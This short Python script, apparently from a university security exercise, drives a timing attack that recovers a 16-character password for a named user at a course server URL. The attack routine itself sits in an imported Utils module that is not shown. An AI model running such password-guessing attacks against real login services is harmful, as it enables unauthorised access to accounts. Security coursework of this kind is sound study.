import Utils

difficulty = 0
username = "curiey"

start_url = f"http://aoi.ise.bgu.ac.il/?user={username}&password="
end_url = f"[&difficulty={difficulty}]"

password = Utils.timing_attack(start_url=start_url, end_url=end_url, password_size=16)

if password:
    print(f"found password: {password}!")
else:
    print("couldn't find password")
